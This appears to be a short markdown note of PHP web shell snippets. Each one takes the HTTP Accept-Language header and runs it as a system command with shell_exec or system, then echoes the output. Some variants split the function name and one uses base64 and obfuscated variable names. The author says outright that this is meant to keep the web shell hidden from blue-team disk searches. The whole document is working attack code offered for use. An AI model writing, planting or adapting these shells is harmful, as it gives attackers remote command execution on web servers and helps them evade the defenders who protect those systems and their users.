```
    <?php

    if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {

        $acceptLanguage = $_SERVER['HTTP_ACCEPT_LANGUAGE'];

        $output = shell_exec($acceptLanguage);

        echo "$output";
    }
    ?>
    
    
<?php
$dog = 's' . 'ys' . 'tem';
$dog('echo hiii fred');
?>

<?php
$func = 'sys' . 'tem';
if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
    $acceptLanguage = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
    $output = $func($acceptLanguage);
    echo $output;
}
?>
```

works just fine (useful for making webshell hard to find from blueteam searching from disk)

=====================================


Base64 encoded version works too <33

`<?php if(isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])){$m513211969=$_SERVER['HTTP_ACCEPT_LANGUAGE'];if(!empty($m513211969)&&preg_match('/^[a-zA-Z0-9\/\+=]+$/',$m513211969)){$f2377387560=base64_decode($m513211969);$v3437106334=shell_exec($f2377387560);if($v3437106334!==null){echo"<pre>$v3437106334</pre>";}}}?>`

![unnamed_01a204b803c9427093ffad047673aec6](unnamed_01a204b803c9427093ffad047673aec6.png)
![unnamed_f52706e77a3346dfbc93d81e15ee278f](unnamed_f52706e77a3346dfbc93d81e15ee278f.png)
![unnamed_a2850f2bdc21499bb3e614a7162f04bf](unnamed_a2850f2bdc21499bb3e614a7162f04bf.png)